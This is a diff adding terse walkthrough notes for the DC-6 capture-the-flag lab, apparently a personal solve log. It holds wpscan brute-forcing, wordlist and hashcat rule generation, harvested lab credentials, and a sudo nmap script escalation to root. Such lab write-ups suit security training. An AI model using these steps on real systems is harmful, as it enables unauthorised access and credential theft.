@@ -1,0 +1,59 @@
+wpscan --url http://wordy/ -e ap,at,u -o wpscan-out
+
+cewl -d 6 -m 4 -w wp-wordlist.txt -e http://wordy/
+
+wpscan --url http://wordy/ -U users.txt -P wp-wordlist.txt
+wpscan --url http://wordy/ -U users.txt -P /usr/share/wordlists/seclists/Passwords/darkweb2017-top1000.txt
+
+hashcat --force --stdout wp-wordlist.txt -r /usr/share/hashcat/rules/toggles1.rule -r /usr/share/hashcat/rules/best64.rule | uniq > wplist.txt
+wpscan --url http://wordy/ -U users.txt -P wplist.txt
+
+# according with author recommendation
+cat /usr/share/wordlists/rockyou.txt | grep k01 > passwords.txt
+wpscan --url http://wordy/ -U users.txt -P passwords.txt
+	mark / helpdesk01
+
+nmap -sV --script http-wordpress-enum wordy
+	user-role-editor 4.24
+
+# open index.html and we have a shell :)
+
+cat /home/mark/stuff/things-to-do.txt
+graham:GSo7isUM1D4
+
+wp-config.php files found:\n/var/www/html/wp-config.php
+define( 'DB_NAME', 'wordpressdb' );
+define( 'DB_USER', 'wpdbuser' );
+define( 'DB_PASSWORD', 'meErKatZ' );
+define( 'DB_HOST', 'localhost' );
+
+$P$B//75HFVPBwqsUTvkBcHA8i4DUJ7Ru0 | jens
+
+# edit /home/jens/backups.sh
+sudo -u jens /home/jens/backups.sh
+jens@dc-6:/home/graham$ whoami
+	jens
+sudo -l
+# we can run nmap as root
+https://gtfobins.github.io/gtfobins/nmap/#shell
+
+TF=$(mktemp)
+echo 'os.execute("/bin/sh")' > $TF
+nmap --script=$TF
+# 
+# theflag.txt
+root@dc-6:~# 
+
+Yb        dP 888888 88     88         8888b.   dP"Yb  88b 88 888888 d8b 
+ Yb  db  dP  88__   88     88          8I  Yb dP   Yb 88Yb88 88__   Y8P 
+  YbdPYbdP   88""   88  .o 88  .o      8I  dY Yb   dP 88 Y88 88""   `"' 
+   YP  YP    888888 88ood8 88ood8     8888Y"   YbodP  88  Y8 888888 (8) 
+
+
+Congratulations!!!
+
+Hope you enjoyed DC-6.  Just wanted to send a big thanks out there to all those
+who have provided feedback, and who have taken time to complete these little
+challenges.
+
+If you enjoyed this CTF, send me a tweet via @DCAU7.
